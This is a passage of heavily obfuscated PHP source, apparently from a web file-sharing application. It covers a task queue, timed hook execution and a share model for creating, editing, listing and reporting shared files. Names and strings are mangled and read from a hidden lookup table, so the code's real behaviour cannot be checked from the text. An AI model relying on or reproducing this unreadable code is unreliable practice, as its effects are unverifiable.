$÷§îŸ£ = array_shift($èÇåñº¶); if (!$÷§îŸ£) { return !1; } self::setAll($èÇåñº¶); $ÏÎä©ò¶ = timeFloat(); try { Hook::apply($÷§îŸ£[$¨©õ¬Â[264]], $÷§îŸ£[$¨©õ¬Â[1761]]); } catch (Exception $Úâª£Ø·) { } $÷¥ŸæÓª = number_format(timeFloat() - $ÏÎä©ò¶, 3) . $¨©õ¬Â[1696]; write_log($¨©õ¬Â[1764] . $÷§îŸ£[$¨©õ¬Â[453]] . $¨©õ¬Â[1765] . $÷¥ŸæÓª, $¨©õ¬Â[1763]); return !0; } public static function count() { $üÎËê€ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$üÎËê€) { return 0; } return intval($üÎËê€); } public static function getAll() { $‹êºë¾¸ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$‹êºë¾¸) { return array(); } return $‹êºë¾¸; } public static function setAll($Ÿáè®à) { $Áß°İ†å = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ÿáè®à), $Áß°İ†å); Cache::set(self::QUEUE_DATA, $Ÿáè®à, $Áß°İ†å); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ë¡±É, $¥ò½¬÷Ú = 5.0) { if (!$Ë¡±É) { return; } $–ŒèÚ«Å = Cache::get($Ë¡±É); if (!$–ŒèÚ«Å || timeFloat() - floatVal($–ŒèÚ«Å) >= $¥ò½¬÷Ú) { Cache::set($Ë¡±É, timeFloat(), $¥ò½¬÷Ú * 10); return !0; } return !1; } public static function timeLimitCall($óŞ‰öÏ, $Í½Æªœ, $ĞÏö´“¡, $öı‚İ¹í = 5.0) { $šÇÒ²Èë =& $_SERVER[³·—™¤¢]; if (!$óŞ‰öÏ || !$Í½Æªœ) { return; } self::$asyncAdd = !0; $Å¾îÏºê = $šÇÒ²Èë[1766]; $åÔÁ“·ù = Cache::get($Å¾îÏºê, !0); $ÎØ·‡Á˜ = array($šÇÒ²Èë[1767] => timeFloat(), $šÇÒ²Èë[1768] => timeFloat(), $šÇÒ²Èë[264] => $Í½Æªœ, $šÇÒ²Èë[1761] => $ĞÏö´“¡, $šÇÒ²Èë[203] => $öı‚İ¹í); if (is_array($åÔÁ“·ù[$óŞ‰öÏ])) { $ÎØ·‡Á˜[$šÇÒ²Èë[1768]] = $åÔÁ“·ù[$óŞ‰öÏ][$šÇÒ²Èë[1768]]; } if (is_array($åÔÁ“·ù[$óŞ‰öÏ])) { if (timeFloat() - $åÔÁ“·ù[$óŞ‰öÏ][$šÇÒ²Èë[1767]] < $ÎØ·‡Á˜[$šÇÒ²Èë[203]] * 0.3) { return; } $ÎØ·‡Á˜[$šÇÒ²Èë[1768]] = $åÔÁ“·ù[$óŞ‰öÏ][$šÇÒ²Èë[1768]]; } $åÔÁ“·ù[$óŞ‰öÏ] = $ÎØ·‡Á˜; Cache::set($Å¾îÏºê, $åÔÁ“·ù, 60); Cache::removeMemory($Å¾îÏºê); write_log($šÇÒ²Èë[1769] . $óŞ‰öÏ . $šÇÒ²Èë[71] . $Í½Æªœ, $šÇÒ²Èë[1763]); } public static function timeLimitCallLoop() { $°é† ’± =& $_SERVER[³·—™¤¢]; $¬ûäÌ = array($°é† ’±[1770]); $¥•É®×î = in_array(strtolower(ACTION), $¬ûäÌ); if (!$¥•É®×î && !self::$asyncAdd) { return; } $”ü‘ùƒÔ = $°é† ’±[1766]; $‡şóğô = Cache::get($”ü‘ùƒÔ, !0); if (!$‡şóğô || count($‡şóğô) <= 0) { return; } $ÏË„ÉÙœ = !1; $ùè¹Š´Œ = timeFloat(); $ÑòÂÁëö = array(); foreach ($‡şóğô as $”ÈÅ°ø => $Ê‘¡´¯£) { if ($ùè¹Š´Œ - $Ê‘¡´¯£[$°é† ’±[1768]] > $Ê‘¡´¯£[$°é† ’±[203]]) { $ÏË„ÉÙœ = !0; try { Hook::apply($Ê‘¡´¯£[$°é† ’±[264]], $Ê‘¡´¯£[$°é† ’±[1761]]); write_log($°é† ’±[1771] . $”ÈÅ°ø . $°é† ’±[71] . $Ê‘¡´¯£[$°é† ’±[264]] . $°é† ’±[1772] . ACTION, $°é† ’±[1763]); } catch (Exception $¢Ï«…š“) { } continue; } $ÑòÂÁëö[$”ÈÅ°ø] = $Ê‘¡´¯£; } if (!$ÏË„ÉÙœ) { return; } if (!$ÑòÂÁëö) { return Cache::remove($”ü‘ùƒÔ); } Cache::set($”ü‘ùƒÔ, $ÑòÂÁëö, 60); Cache::removeMemory($”ü‘ùƒÔ); } public static function finished($ëíÄüÕø, $¹ıñŠ¼œ) { $‰øƒµõ =& $_SERVER[³·—™¤¢]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($‰øƒµõ[264] => $ëíÄüÕø, $‰øƒµõ[1761] => $¹ıñŠ¼œ); } private static function finishedRun() { $´ŸÖÃ¯ =& $_SERVER[³·—™¤¢]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ºî­“¾È) { try { Hook::apply($ºî­“¾È[$´ŸÖÃ¯[264]], $ºî­“¾È[$´ŸÖÃ¯[1761]]); } catch (Exception $ÆÍ“¤òÇ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto AÙôñÁØèÆ; e±—¶ğ¬: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\163\x65\x72\x74\x2c\x75\160\x64\x61\164\x65", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\143\x72\145\141\x74\145\124\x69\155\x65", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\156\143\x74\151\x6f\x6e"), array("\157\160\164\151\157\156\x73", '', "\x69\156\x73\145\x72\164\x2c\x75\x70\144\x61\164\145\54\163\145\x6c\145\143\164", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($†Üûî») { $±¸ÙÅÖÉ =& $_SERVER[³·—™¤¢]; $ÀşÈçôş = isset($†Üûî»[0]) ? $†Üûî»[0] : !1; return array($±¸ÙÅÖÉ[1991] => array(USER_ID, $±¸ÙÅÖÉ[1992]), $±¸ÙÅÖÉ[1932] => array($ÀşÈçôş, $±¸ÙÅÖÉ[1993])); } protected function listSimple() { $Ä·ÃÃÁù = array($_SERVER[³·—™¤¢][1680] => USER_ID); $Ë²­“èš = $this->field($this->fieldList)->where($Ä·ÃÃÁù)->select(); return $Ë²­“èš ? $Ë²­“èš : array(); } protected function getInfo($Üá¼›†Ç, $ØêÖ³ïı = false) { $¿ùÙêÔƒ =& $_SERVER[³·—™¤¢]; if ($ØêÖ³ïı) { return $this->_getShareInfo(array($¿ùÙêÔƒ[489] => $Üá¼›†Ç)); } $ôÆ×° = $this->cacheFunctionGet($¿ùÙêÔƒ[1934], $Üá¼›†Ç); return $ôÆ×°; } public function getInfoByHash($µôˆ°™Ç) { return $this->_getShareInfo(array($_SERVER[³·—™¤¢][491] => $µôˆ°™Ç)); } public function getInfoByPath($Óã é¨º) { $Ëã×ä”± =& $_SERVER[³·—™¤¢]; $†É¼Ñ­ = array($Ëã×ä”±[1680] => USER_ID, $Ëã×ä”±[402] => $Óã é¨º); return $this->_getShareInfo($†É¼Ñ­); } public function getInfoBySourcePath($Ú‚«æ¿ˆ) { $İ—Æ¥ú˜ =& $_SERVER[³·—™¤¢]; $Ùğ®Ó¥ = array($İ—Æ¥ú˜[1680] => USER_ID, $İ—Æ¥ú˜[1199] => $Ú‚«æ¿ˆ); return $this->_getShareInfo($Ùğ®Ó¥); } private function _getShareInfo($¨èÃûµ‰) { $¶Éä‡Âæ =& $_SERVER[³·—™¤¢]; $„—³ÇÈ = $this->where($¨èÃûµ‰)->find(); if (!$„—³ÇÈ) { return !1; } $¨èÃûµ‰ = array($¶Éä‡Âæ[489] => $„—³ÇÈ[$¶Éä‡Âæ[489]]); $ıà¨ïÀô = $¶Éä‡Âæ[1994]; $˜˜Œ–Ø  = Model($¶Éä‡Âæ[602])->order($¶Éä‡Âæ[399])->field($ıà¨ïÀô)->where($¨èÃûµ‰)->select(); if ($„—³ÇÈ[$¶Éä‡Âæ[402]] == $¶Éä‡Âæ[197]) { $„—³ÇÈ[$¶Éä‡Âæ[86]] = IO::info($„—³ÇÈ[$¶Éä‡Âæ[1199]]); } else { $„—³ÇÈ[$¶Éä‡Âæ[86]] = Model($¶Éä‡Âæ[1350])->pathInfo($„—³ÇÈ[$¶Éä‡Âæ[402]]); } $„—³ÇÈ[$¶Éä‡Âæ[1995]] = $˜˜Œ–Ø ; return $„—³ÇÈ; } protected function getInfoAuth($ Å‚ğ½·) { $ÎÚ¿¤¤Ÿ =& $_SERVER[³·—™¤¢]; $ù¨¸‡”Á = $this->getInfo($ Å‚ğ½·); if ($ù¨¸‡”Á[$ÎÚ¿¤¤Ÿ[1680]] == USER_ID) { $ù¨¸‡”Á[$ÎÚ¿¤¤Ÿ[413]] = $ù¨¸‡”Á[$ÎÚ¿¤¤Ÿ[86]][$ÎÚ¿¤¤Ÿ[413]]; } else { $ù¨¸‡”Á[$ÎÚ¿¤¤Ÿ[413]] = Model($ÎÚ¿¤¤Ÿ[502])->authMake($ù¨¸‡”Á[$ÎÚ¿¤¤Ÿ[1995]]); } return $ù¨¸‡”Á; } protected function listData($‹ïÛ‰í‹ = null, $½„÷É¡® = 300) { $šöäĞ³¼ =& $_SERVER[³·—™¤¢]; $êŠô–ëÇ = array(array($šöäĞ³¼[494] => array($šöäĞ³¼[1035], 0), $šöäĞ³¼[496] => array($šöäĞ³¼[1035], 0), $šöäĞ³¼[1996] => $šöäĞ³¼[1950])); if ($‹ïÛ‰í‹ == $šöäĞ³¼[1997]) { $êŠô–ëÇ = array($šöäĞ³¼[494] => 1); } else { if ($‹ïÛ‰í‹ == $šöäĞ³¼[1184]) { $êŠô–ëÇ = array($šöäĞ³¼[496] => 1); } } $êŠô–ëÇ[$šöäĞ³¼[1680]] = USER_ID; $÷ñ¡»¯’ = $this->where($êŠô–ëÇ)->selectPage($½„÷É¡®); return $÷ñ¡»¯’; } protected function listToMe($”ÊÇš¼» = 300) { $óÓ·¢½À =& $_SERVER[³·—™¤¢]; $ˆé‚›æÓ = Model($óÓ·¢½À[1998])->userGroupParents(USER_ID); $Â›Ïı½à = array($óÓ·¢½À[586] => SourceModel::TYPE_USER, $óÓ·¢½À[505] => USER_ID); if ($ˆé‚›æÓ) { $Â›Ïı½à = array(array($óÓ·¢½À[586] => SourceModel::TYPE_USER, $óÓ·¢½À[505] => USER_ID), array($óÓ·¢½À[586] => SourceModel::TYPE_GROUP, $óÓ·¢½À[505] => array($óÓ·¢½À[7], $ˆé‚›æÓ)), $óÓ·¢½À[1996] => $óÓ·¢½À[1950]); } $şí¢ÅŞ‘ = Model($óÓ·¢½À[602])->where($Â›Ïı½à)->selectPage($”ÊÇš¼»); $˜ŠÍ×› = array_to_keyvalue_group($şí¢ÅŞ‘[$óÓ·¢½À[369]], $óÓ·¢½À[489]); if (!$˜ŠÍ×›) { return $şí¢ÅŞ‘; } $ìÚù¶À§ = $óÓ·¢½À[1999]; $Â›Ïı½à = array($óÓ·¢½À[489] => array($óÓ·¢½À[418], array_keys($˜ŠÍ×›)), $óÓ·¢½À[1680] => array($óÓ·¢½À[1037], $óÓ·¢½À[197])); $¬îÉ€ÍË = $this->field($ìÚù¶À§)->where($Â›Ïı½à)->select(); foreach ($¬îÉ€ÍË as $©¼®—Ò => &$±™ôôÉé) { $±™ôôÉé[$óÓ·¢½À[1995]] = $˜ŠÍ×›[$±™ôôÉé[$óÓ·¢½À[489]]]; } unset($±™ôôÉé); $ãòÉ¼şß = array($óÓ·¢½À[2000] => $¬îÉ€ÍË, $óÓ·¢½À[2001] => $şí¢ÅŞ‘[$óÓ·¢½À[366]]); return $ãòÉ¼şß; } protected function shareAdd($ˆ“âÇçÒ, $Ñ§Å¥ˆø) { $ŠéÒ°€ =& $_SERVER[³·—™¤¢]; $¸ÎÚÀ¢” = $this->_addShareData($ˆ“âÇçÒ, $Ñ§Å¥ˆø); if (!empty($Ñ§Å¥ˆø[$ŠéÒ°€[2002]])) { $this->_shareAuthSet($¸ÎÚÀ¢”, $Ñ§Å¥ˆø[$ŠéÒ°€[2002]]); } $this->shareEventAdd($ˆ“âÇçÒ, $Ñ§Å¥ˆø, $ŠéÒ°€[1187]); return $¸ÎÚÀ¢”; } protected function shareAddSystem($Óªò‘ô², $ƒç—Ó‹Ö) { $‡Œ¤Õ×… =& $_SERVER[³·—™¤¢]; $ìÇ·½òÅ = $this->_addShareData($Óªò‘ô², $ƒç—Ó‹Ö, $‡Œ¤Õ×…[1299]); $this->_shareAuthSet($ìÇ·½òÅ, $ƒç—Ó‹Ö[$‡Œ¤Õ×…[2002]]); return $ìÇ·½òÅ; } private function shareEventAdd($“ÖƒØ¬£, $åŒ¸¤á´, $•ûäøÒÂ = "\x61\144\144") { $¢ÀÆúÖ  =& $_SERVER[³·—™¤¢]; if (!$“ÖƒØ¬£ || $“ÖƒØ¬£ == $¢ÀÆúÖ [197]) { return; } if ($•ûäøÒÂ == $¢ÀÆúÖ [1187]) { if ($åŒ¸¤á´[$¢ÀÆúÖ [494]] == $¢ÀÆúÖ [88]) { Model($¢ÀÆúÖ [570])->eventShare($“ÖƒØ¬£, $¢ÀÆúÖ [2003]); } if ($åŒ¸¤á´[$¢ÀÆúÖ [496]] == $¢ÀÆúÖ [88]) { Model($¢ÀÆúÖ [570])->eventShare($“ÖƒØ¬£, $¢ÀÆúÖ [2004]); } return; } $Ô³ë½å¹ = $this->getInfoByPath($“ÖƒØ¬£); $˜ïú»à = $¢ÀÆúÖ [2005]; if ($Ô³ë½å¹[$¢ÀÆúÖ [494]] == $¢ÀÆúÖ [197] && $åŒ¸¤á´[$¢ÀÆúÖ [494]] == $¢ÀÆúÖ [88]) { $˜ïú»à = $¢ÀÆúÖ [2003]; } if ($Ô³ë½å¹[$¢ÀÆúÖ [494]] == $¢ÀÆúÖ [88] && $åŒ¸¤á´[$¢ÀÆúÖ [494]] == $¢ÀÆúÖ [197]) { $˜ïú»à = $¢ÀÆúÖ [2006]; } if ($Ô³ë½å¹[$¢ÀÆúÖ [496]] == $¢ÀÆúÖ [197] && $åŒ¸¤á´[$¢ÀÆúÖ [496]] == $¢ÀÆúÖ [88]) { $˜ïú»à = $¢ÀÆúÖ [2004]; } if ($Ô³ë½å¹[$¢ÀÆúÖ [496]] == $¢ÀÆúÖ [88] && $åŒ¸¤á´[$¢ÀÆúÖ [496]] == $¢ÀÆúÖ [197]) { $˜ïú»à = $¢ÀÆúÖ [2007]; } Model($¢ÀÆúÖ [570])->eventShare($“ÖƒØ¬£, $˜ïú»à); return; } private function _addShareData($ê š‡å’, $®Ì£íÇ– = array(), $Ş•©§Îš = false) { $‚¶‹‡š” =& $_SERVER[³·—™¤¢]; $éâê²¦Ï = $Ş•©§Îš == $‚¶‹‡š”[1299] ? 0 : USER_ID; $ÁÌî¬¬Ù = array($‚¶‹‡š”[417] => $ê š‡å’, $‚¶‹‡š”[1671] => $éâê²¦Ï); if ($ê š‡å’ == 0) { $ÁÌî¬¬Ù = array($‚¶‹‡š”[2008] => $®Ì£íÇ–[$‚¶‹‡š”[1199]], $‚¶‹‡š”[1671] => $éâê²¦Ï); } if ($šéĞ‡ = $this->where($ÁÌî¬¬Ù)->find()) { return $šéĞ‡[$‚¶‹‡š”[489]]; } if ($ê š‡å’ == 0) { $ê¯òÚÈ… = array($‚¶‹‡š”[32] => get_path_this($®Ì£íÇ–[$‚¶‹‡š”[84]])); } else { $ê¯òÚÈ… = Model($‚¶‹‡š”[845])->sourceInfo($ê š‡å’); if (!$ê¯òÚÈ…) { return !1; } } if (!$®Ì£íÇ–[$‚¶‹‡š”[1577]]) { $®Ì£íÇ–[$‚¶‹‡š”[1577]] = $ê¯òÚÈ…[$‚¶‹‡š”[32]]; } $–Éš†Åª = array($‚¶‹‡š”[1671] => $éâê²¦Ï, $‚¶‹‡š”[417] => $ê š‡å’, $‚¶‹‡š”[1577] => $‚¶‹‡š”[12], $‚¶‹‡š”[494] => 0, $‚¶‹‡š”[496] => 0, $‚¶‹‡š”[1199] => $‚¶‹‡š”[12], $‚¶‹‡š”[307] => $‚¶‹‡š”[12], $‚¶‹‡š”[909] => $‚¶‹‡š”[12], $‚¶‹‡š”[2009] => 0, $‚¶‹‡š”[2010] => 0, $‚¶‹‡š”[497] => 0, $‚¶‹‡š”[498] => $‚¶‹‡š”[12], $‚¶‹‡š”[491] => $‚¶‹‡š”[12]); $¡’»¥ğ = explode($‚¶‹‡š”[50], $‚¶‹‡š”[2011]); foreach ($¡’»¥ğ as $ïüÊ¢¤Ë) { if (!isset($®Ì£íÇ–[$ïüÊ¢¤Ë])) { continue; } $–Éš†Åª[$ïüÊ¢¤Ë] = $®Ì£íÇ–[$ïüÊ¢¤Ë]; } $ŞŞû¢Ü¸ = $this->add($–Éš†Åª); $ÅõŒäì’ = array($‚¶‹‡š”[491] => short_id($ŞŞû¢Ü¸)); $this->where(array($‚¶‹‡š”[488] => $ŞŞû¢Ü¸))->save($ÅõŒäì’); return $ŞŞû¢Ü¸; } private function _shareAuthSet($Ò…û÷Ï, $î³›€¬“) { $Œ£ü¹œ´ =& $_SERVER[³·—™¤¢]; if (!is_array($î³›€¬“)) { return !1; } $·¼ëúÄ = Model($Œ£ü¹œ´[1960]); $·¼ëúÄ->where(array($Œ£ü¹œ´[489] => $Ò…û÷Ï))->delete(); $‡÷³²ùÂ = array(); foreach ($î³›€¬“ as $½ô®ãë) { $Šˆ¹Şû¤ = SourceModel::TYPE_USER; if ($½ô®ãë[$Œ£ü¹œ´[411]] == SourceModel::TYPE_GROUP) { $Šˆ¹Şû¤ = SourceModel::TYPE_GROUP; } $œ÷ó¨œ¹ = array($Œ£ü¹œ´[489] => $Ò…û÷Ï, $Œ£ü¹œ´[411] => $Šˆ¹Şû¤, $Œ£ü¹œ´[505] => intval($½ô®ãë[$Œ£ü¹œ´[505]]), $Œ£ü¹œ´[1956] => 0, $Œ£ü¹œ´[2012] => -1); if ($½ô®ãë[$Œ£ü¹œ´[1956]]) { $œ÷ó¨œ¹[$Œ£ü¹œ´[1956]] = $½ô®ãë[$Œ£ü¹œ´[1956]]; } else { if ($½ô®ãë[$Œ£ü¹œ´[2012]]) { $œ÷ó¨œ¹[$Œ£ü¹œ´[2012]] = $½ô®ãë[$Œ£ü¹œ´[2012]]; } } $‡÷³²ùÂ[] = $œ÷ó¨œ¹; } return $·¼ëúÄ->addAll($‡÷³²ùÂ, array(), !0); } public function numViewAdd($ Ø´ŞØ) { $à öÁëß =& $_SERVER[³·—™¤¢]; $­Ôœõ¥é = array($à öÁëß[488] => $ Ø´ŞØ); $this->where($­Ôœõ¥é)->setAdd($à öÁëß[2009]); } public function numDownloadAdd($şÕ¥ÁÊè) { $µÏ«‹ë‘ =& $_SERVER[³·—™¤¢]; $şÍÖÜúş = array($µÏ«‹ë‘[488] => $şÕ¥ÁÊè); $this->where($şÍÖÜúş)->setAdd($µÏ«‹ë‘[2010]); } protected function shareEdit($×Ó¥÷Ï, $µç¢şôã) { $«şîº„ =& $_SERVER[³·—™¤¢]; $Ñ‚€É¶” = $this->getInfo($×Ó¥÷Ï); if (!$Ñ‚€É¶”) { return !1; } $this->_checkLinkShare($µç¢şôã, $Ñ‚€É¶”); $Ù®£®ó¦ = array(); $¸²ı«õ¾ = explode($«şîº„[50], $«şîº„[2013]); foreach ($¸²ı«õ¾ as $éê†Í‹í) { if (!array_key_exists($éê†Í‹í, $µç¢şôã)) { continue; } $Ù®£®ó¦[$éê†Í‹í] = $µç¢şôã[$éê†Í‹í]; } $this->shareEventAdd($Ñ‚€É¶”[$«şîº„[402]], $µç¢şôã, $«şîº„[1822]); $this->where(array($«şîº„[488] => $×Ó¥÷Ï))->save($Ù®£®ó¦); if (isset($µç¢şôã[$«şîº„[2002]])) { $this->_shareAuthSet($×Ó¥÷Ï, $µç¢şôã[$«şîº„[2002]]); } return !0; } private function _checkLinkShare($Ì™É×, $äğ±ç‰ô) { $½Áßë =& $_SERVER[³·—™¤¢]; if ($Ì™É×[$½Áßë[494]] != $½Áßë[88]) { return; } $¤ºæ—÷Ê = $äğ±ç‰ô[$½Áßë[86]][$½Áßë[402]]; if ($äğ±ç‰ô[$½Áßë[86]][$½Áßë[33]] != $½Áßë[199]) { $øÉı­¤¦ = $this->_folderReport($¤ºæ—÷Ê); if (!$øÉı­¤¦) { return; } show_json(LNG($½Áßë[2014]) . $½Áßë[2015] . $øÉı­¤¦, !1); } $ØŞİÀÂÔ = Model($½Áßë[845])->fileInfoGet($äğ±ç‰ô[$½Áßë[86]][$½Áßë[402]]); if (!$ØŞİÀÂÔ) { return; } $ç¢í¯´ = $this->shareFileMeta($ØŞİÀÂÔ[$½Áßë[468]]); if (isset($ç¢í¯´[$½Áßë[374]]) && $ç¢í¯´[$½Áßë[374]] == $½Áßë[88]) { show_json(LNG($½Áßë[2016]), !1); } } private function _folderReport($å­ğÅ) { $¡²äáÅ =& $_SERVER[³·—™¤¢]; $“£×ıÂ = array($¡²äáÅ[468] => array($¡²äáÅ[1035], 0), $¡²äáÅ[770] => 3); $ƒ‰´úåˆ = Model($¡²äáÅ[2017])->where($“£×ıÂ)->field($¡²äáÅ[468])->select(); if (!$ƒ‰´úåˆ) { return !1; } $ƒ‰´úåˆ = array_to_keyvalue($ƒ‰´úåˆ, $¡²äáÅ[12], $¡²äáÅ[468]); $§Íë¢Ø© = $¡²äáÅ[50] . $å­ğÅ . $¡²äáÅ[50]; $“£×ıÂ = array($¡²äáÅ[468] => array($¡²äáÅ[7], $ƒ‰´úåˆ), $¡²äáÅ[521] => array($¡²äáÅ[383], "\45{$§Íë¢Ø©}\45"), $¡²äáÅ[431] => 0); $ÜâÄ‹ö = Model($¡²äáÅ[845])->where($“£×ıÂ)->field($¡²äáÅ[2018])->find(); if (!$ÜâÄ‹ö) { return !1; } $˜“òÍÓÓ = substr($ÜâÄ‹ö[$¡²äáÅ[521]], strpos($ÜâÄ‹ö[$¡²äáÅ[521]], $§Íë¢Ø©)); $“£×ıÂ = array($¡²äáÅ[402] => array($¡²äáÅ[7], trim($˜“òÍÓÓ, $¡²äáÅ[50]))); $€‹˜ÇÓù = Model($¡²äáÅ[845])->where($“£×ıÂ)->field($¡²äáÅ[32])->select(); $ªüÂÇ = array_to_keyvalue($€‹˜ÇÓù, $¡²äáÅ[12], $¡²äáÅ[32]); $ªüÂÇ[] = $ÜâÄ‹ö[$¡²äáÅ[32]]; return implode($¡²äáÅ[8], $ªüÂÇ); } protected function remove($§÷íëó) { $ÉœèùÂÁ =& $_SERVER[³·—™¤¢]; if (is_array($§÷íëó)) { $§÷íëó = array($ÉœèùÂÁ[7], $§÷íëó); } $™ğÚğ¹ø = array($ÉœèùÂÁ[489] => $§÷íëó); $Ö˜Ú­Ğ = $this->where($™ğÚğ¹ø)->delete(); if ($Ö˜Ú­Ğ) { Model($ÉœèùÂÁ[602])->where(array($ÉœèùÂÁ[489] => $§÷íëó))->delete(); } $©Ê¬ØÑ = is_array($§÷íëó) ? $§÷íëó[1] : array($§÷íëó); for ($íÅı´”À = 0; $íÅı´”À < count($©Ê¬ØÑ); $íÅı´”À++) { $Á¯ãâ¼À = $this->getInfo($©Ê¬ØÑ[$íÅı´”À]); if ($Á¯ãâ¼À[$ÉœèùÂÁ[496]] == $ÉœèùÂÁ[88]) { Model($ÉœèùÂÁ[570])->eventShare($Á¯ãâ¼À[$ÉœèùÂÁ[402]], $ÉœèùÂÁ[2007]); } if ($Á¯ãâ¼À[$ÉœèùÂÁ[494]] == $ÉœèùÂÁ[88]) { Model($ÉœèùÂÁ[570])->eventShare($Á¯ãâ¼À[$ÉœèùÂÁ[402]], $ÉœèùÂÁ[2006]); } } return $Ö˜Ú­Ğ; } protected function removeBySource($úö÷ĞÃ½) { $—äÈ÷ñ¸ =& $_SERVER[³·—™¤¢]; $æÓÁê¢ = array($—äÈ÷ñ¸[417] => array($—äÈ÷ñ¸[418], $úö÷ĞÃ½)); $áõÓŞ™Ï = $this->field($—äÈ÷ñ¸[489])->where($æÓÁê¢)->select(); $áõÓŞ™Ï = array_to_keyvalue($áõÓŞ™Ï, $—äÈ÷ñ¸[12], $—äÈ÷ñ¸[489]); if (!$áõÓŞ™Ï) { return; } $æÓÁê¢ = array($—äÈ÷ñ¸[488] => array($—äÈ÷ñ¸[418], $áõÓŞ™Ï)); $this->where($æÓÁê¢)->delete(); Model($—äÈ÷ñ¸[602])->where($æÓÁê¢)->delete(); } public function listAll($œş—ÓÑ) { $¬ÙË›Âü =& $_SERVER[³·—™¤¢]; $¹×¢Íç¡ = array(); if ($œş—ÓÑ[$¬ÙË›Âü[1680]]) { $¹×¢Íç¡[$¬ÙË›Âü[1680]] = $œş—ÓÑ[$¬ÙË›Âü[1680]]; } if ($œş—ÓÑ[$¬ÙË›Âü[781]]) { $ÌØÙğ‹‰ = $œş—ÓÑ[$¬ÙË›Âü[497]] ? $œş—ÓÑ[$¬ÙË›Âü[497]] : strtotime(date($¬ÙË›Âü[2019])); $¹×¢Íç¡[$¬ÙË›Âü[200]] = array($¬ÙË›Âü[333], array($œş—ÓÑ[$¬ÙË›Âü[781]], $ÌØÙğ‹‰)); } if ($œş—ÓÑ[$¬ÙË›Âü[33]]) { $¹×¢Íç¡[$œş—ÓÑ[$¬ÙË›Âü[33]]] = 1; } else { $¹×¢Íç¡[] = array($¬ÙË›Âü[494] => array($¬ÙË›Âü[1035], 0), $¬ÙË›Âü[496] => array($¬ÙË›Âü[1035], 0), $¬ÙË›Âü[1996] => $¬ÙË›Âü[1950]); } if ($œş—ÓÑ[$¬ÙË›Âü[1946]]) { $¹×¢Íç¡[] = array($¬ÙË›Âü[491] => $œş—ÓÑ[$¬ÙË›Âü[1946]], $¬ÙË›Âü[1577] => array($¬ÙË›Âü[383], "\45{$œş—ÓÑ[$¬ÙË›Âü[1946]]}\45"), $¬ÙË›Âü[1996] => $¬ÙË›Âü[1950]); } $ ¬¿œ¿í = $this->_makeOrder()->where($¹×¢Íç¡)->selectPage(20); if (empty($ ¬¿œ¿í[$¬ÙË›Âü[369]])) { return array(); } $this->_listDataApply($ ¬¿œ¿í[$¬ÙË›Âü[369]]); return $ ¬¿œ¿í; } public function listDataApply($¼„è¡Š–) { $this->_listDataApply($¼„è¡Š–); return $¼„è¡Š–; } private function _listDataApply(&$…¯ÑŠˆ) { $—×ùÈ¡ƒ =& $_SERVER[³·—™¤¢]; $ã°™ğ¿— = array_to_keyvalue($…¯ÑŠˆ, $—×ùÈ¡ƒ[12], $—×ùÈ¡ƒ[1680]); $İŸ„‰Ìƒ = Model($—×ùÈ¡ƒ[535])->userListInfo(array_unique($ã°™ğ¿—)); $Æíê‘ù– = array_to_keyvalue($…¯ÑŠˆ, $—×ùÈ¡ƒ[12], $—×ùÈ¡ƒ[402]); $‘Éä“¹¸ = Model($—×ùÈ¡ƒ[845])->sourceListInfo($Æíê‘ù–, !0); foreach ($…¯ÑŠˆ as $¶‡£­¢Ó => &$íÖØ‡) { $îÒÒê = $íÖØ‡[$—×ùÈ¡ƒ[1680]]; $íÖØ‡[$—×ùÈ¡ƒ[2020]] = $İŸ„‰Ìƒ[$îÒÒê] ? $İŸ„‰Ìƒ[$îÒÒê] : !1; $„®³ÅÙ° = $íÖØ‡[$—×ùÈ¡ƒ[402]]; $íÖØ‡[$—×ùÈ¡ƒ[86]] = $‘Éä“¹¸[$„®³ÅÙ°] ? $‘Éä“¹¸[$„®³ÅÙ°] : !1; if ($íÖØ‡[$—×ùÈ¡ƒ[86]][$—×ùÈ¡ƒ[431]] == $—×ùÈ¡ƒ[88]) { unset($…¯ÑŠˆ[$¶‡£­¢Ó]); } if ($íÖØ‡[$—×ùÈ¡ƒ[86]] != $—×ùÈ¡ƒ[197] && !$íÖØ‡[$—×ùÈ¡ƒ[86]]) { unset($…¯ÑŠˆ[$¶‡£­¢Ó]); } } unset($íÖØ‡); $…¯ÑŠˆ = array_values($…¯ÑŠˆ); } private function _makeOrder($–¡¿Ùü = '') { $¾ïˆš‰â =& $_SERVER[³·—™¤¢]; $ßÔ‡úÜî = array($¾ïˆš‰â[200], $¾ïˆš‰â[497], $¾ïˆš‰â[2009], $¾ïˆš‰â[2010]); $îØšÇ°‘ = array($¾ïˆš‰â[450] => $¾ïˆš‰â[451], $¾ïˆš‰â[452] => $¾ïˆš‰â[453]); $¹•Şä² = Input::get($¾ïˆš‰â[457], $¾ïˆš‰â[7], $¾ïˆš‰â[423], $ßÔ‡úÜî); $â´‹ì¼‡ = Input::get($¾ïˆš‰â[458], $¾ïˆš‰â[7], $¾ïˆš‰â[2021], array($¾ïˆš‰â[1943], $¾ïˆš‰â[452])); $â´‹ì¼‡ = $îØšÇ°‘[$â´‹ì¼‡]; $–¡¿Ùü = $–¡¿Ùü . "{$¹•Şä²}\x20{$â´‹ì¼‡}"; return $this->order($–¡¿Ùü); } public function reportAdd($òÇ”±ú›) { $¤™ş£ü =& $_SERVER[³·—™¤¢]; $’ôªş–¹ = array($¤™ş£ü[489] => $òÇ”±ú›[$¤™ş£ü[489]], $¤™ş£ü[1680] => USER_ID); if (Model($¤™ş£ü[2017])->where($’ôªş–¹)->find()) { return !1; } $˜Ğ£»õ = array($¤™ş£ü[489] => $òÇ”±ú›[$¤™ş£ü[489]], $¤™ş£ü[1577] => 